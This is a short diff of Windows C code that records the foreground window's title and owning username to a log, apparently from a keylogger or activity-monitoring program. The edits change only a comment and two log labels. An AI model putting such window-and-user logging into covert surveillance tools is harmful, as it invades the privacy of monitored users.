@@ -865,7 +865,7 @@ VOID GetUsernameOfForegroundWindow(LPSTR username, DWORD foregroundWindowPID)
         
         if (LookupAccountSid(NULL, pTokenUser->User.Sid, name, &nameSize, domain, &domainSize, &sidType))
         {
-            strncpy_s(username, 4096, domain, _TRUNCATE);//_countof is a macro, _TRUNCATE will truncate the string if dst is too small
+            strncpy_s(username, 4096, domain, _TRUNCATE);//_TRUNCATE will truncate the string if dst is too small
             strncat_s(username, 4096, "\\", _TRUNCATE);
             strncat_s(username, 4096, name, _TRUNCATE);
         }
@@ -885,7 +885,7 @@ VOID GetWindowTitle(HWND hwnd)
 {
     if (hwnd == NULL)
     {
-        strcpy_s(foregroundWindowTitle, 4096, "[GetWinTitle Failed]");
+        strcpy_s(foregroundWindowTitle, 4096, "[GetWindowTitle Failed]");
         log(foregroundWindowTitle, CHAR_MODE, TRUE);
         return;
     }
@@ -895,6 +895,6 @@ VOID GetWindowTitle(HWND hwnd)
     GetWindowTextA(hwnd, foregroundWindowTitle, windowTitleLen + 1);
     log(foregroundWindowTitle, CHAR_MODE, TRUE);
     if (!strlen(foregroundWindowTitle))
-        log("NO WINDOW", CHAR_MODE, TRUE);
+        log("[NO WINDOW]", CHAR_MODE, TRUE);
     foregroundWindowChanged = TRUE;
 }
